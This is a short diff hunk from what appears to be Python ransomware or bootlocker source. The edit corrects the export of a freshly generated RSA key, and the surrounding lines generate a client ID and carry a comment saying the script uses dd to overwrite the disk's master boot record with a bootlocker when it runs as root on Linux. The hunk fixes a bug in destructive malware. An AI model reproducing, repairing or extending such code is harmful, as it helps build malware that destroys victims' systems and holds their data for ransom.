@@ -25,7 +25,7 @@ def gen_client_ID(size=12, chars=string.ascii_uppercase + string.digits):
 
 ID = gen_client_ID(12)
 key = RSA.generate(2048)
-exKey = RSA.exportKey('PEM')
+exKey = key.exportKey('PEM')
 
 # Check to see if we're on linux and have root, if so use dd to override the MBR with our bootlocker.
 if sys.platform == 'linux2' and gp.getuser() == 'root':
